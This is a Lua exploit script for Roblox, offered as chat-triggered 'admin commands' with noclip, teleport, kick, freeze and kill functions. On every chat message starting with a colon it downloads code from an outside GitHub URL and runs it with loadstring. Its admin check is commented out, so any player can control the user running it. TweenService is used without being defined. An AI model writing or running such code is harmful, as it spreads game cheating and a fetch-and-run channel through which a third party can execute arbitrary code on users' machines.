if getgenv().EnoxsCommandsExecuted then
    return
end

getgenv().EnoxsCommandsExecuted = true



local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Mouse = Player:GetMouse()

local CoreGui = game:GetService('CoreGui')
local UserInputService = game:GetService('UserInputService')
local RunService = game:GetService('RunService')
local Players = game.Players

Player.CharacterAdded:connect(function(NewCharacter)
    Character = NewCharacter
end)

local NoClippConnection;
function Noclip()
    local function SNoclipLoop()
			for _, child in pairs(Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
			child.CanCollide = false
		end
	  end
   end
   NoClippConnection = RunService.Stepped:Connect(SNoclipLoop)
end

function Clip()
    if NoClippConnection then
        NoClippConnection:Disconnect()
    end
end

function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

function getPlayer(shortcut)
    local player = nil
  
    local g = game.Players:GetPlayers()
    for i = 1, #g do
      if string.lower(string.sub(g[i].Name, 1, string.len(shortcut))) == string.lower(shortcut) or string.lower(string.sub(g[i].DisplayName, 1, string.len(shortcut))) == string.lower(shortcut) then
        player = g[i]
        break
      end
    end
  
    return player
  
end



function TeleportTo(Location)
    if Character then
      pcall(function()
      local Seats = {}
    
    for i,v in pairs(workspace:GetDescendants()) do 
      if v:IsA('Seat') and v.Disabled == false then
        table.insert(Seats,v); v.Disabled = true
      end
    end
    

    Noclip()
      --CheckForVelocity()
       local a = TweenService:Create(getRoot(Character), TweenInfo.new(5, Enum.EasingStyle.Linear), {CFrame = Location})
        a:Play()
        a.Completed:Wait()
      --RemoveVelocity()
    Clip()

    for i,v in pairs(workspace:GetDescendants()) do 
      if v:IsA('Seat') and table.find(Seats,v) then
        local a = table.find(Seats,v);  table.remove(Seats,a)
        v.Disabled = false
      end
    end
    wait(.1)

       end)    
    end
end

function CheckArgs2(Args)
    local p = getPlayer(Args)
        if Args == "." or p == Player then
        return true
    end
    return false
end



task.spawn(function()
	coroutine.resume(coroutine.create(function()
		local ChatEvents = game:GetService('ReplicatedStorage'):WaitForChild("DefaultChatSystemChatEvents", math.huge)
		local OnMessageEvent = ChatEvents:WaitForChild("OnMessageDoneFiltering", math.huge)
        if OnMessageEvent:IsA("RemoteEvent") then
            OnMessageEvent.OnClientEvent:Connect(function(data)
                if data ~= nil then
                    local speaker = tostring(data.FromSpeaker)
                    local msg = tostring(data.Message)
                    local originalchannel = tostring(data.OriginalChannel)
                    msg = string.lower(msg)
                    local Args = string.split(msg," ")
                    if string.sub(msg,1,1) == ":" then
                    local p = loadstring(game:HttpGet("https://raw.githubusercontent.com/nbayoungboyfan1964/AdminCommands/main/Admins"))()
                    --if table.find(p,speaker) then
                    if not Args[2] then
                        return
                    end
-----------------------------------------------------------------------------------------------------------------------------------
		                
                     if string.sub(msg,2,5) == "kick" then
                         local Results = CheckArgs2(Args[2])
                         if Results then
                             local Message = "Kicked!"
                            if Args[3] then
                                Message = Args[3]
                            end
                            Player:Kick(Message)
                         end
                     end
                     
                     if string.sub(msg,2,7) == "freeze" then
                          local Results = CheckArgs2(Args[2])
                             if Results then
                         for i,v in pairs(Character:GetChildren()) do
                             if v:IsA("BasePart") then
                                 v.Anchored = true
                               end
                            end
                         end
                     elseif string.sub(msg,2,9) == "unfreeze" then
                         local Results = CheckArgs2(Args[2])
                           if Results then
                        for i,v in pairs(Character:GetChildren()) do
                             if v:IsA("BasePart") and v.Anchored then
                                 v.Anchored = false
                             end
                          end
                       end
                    end
                  
                   if string.sub(msg,2,6) == "bring" then
                        local Results = CheckArgs2(Args[2])
                         if Results then
                        local Person = Players:FindFirstChild(speaker)
                        if Person and Person.Character and getRoot(Person.Character) then
                        TeleportTo(getRoot(Person.Character).CFrame)
                        end
                      end
                   end
                   
                   if string.sub(msg,2,5) == "kill" then
                     local Results = CheckArgs2(Args[2])
                         if Results then
                       Character.UpperTorso:Destroy()
                       end
                    end
                
                     

-----------------------------------------------------------------------------------------------------------------------------------
                      end
                  -- end
                end
            end)
        end
	end))
end)

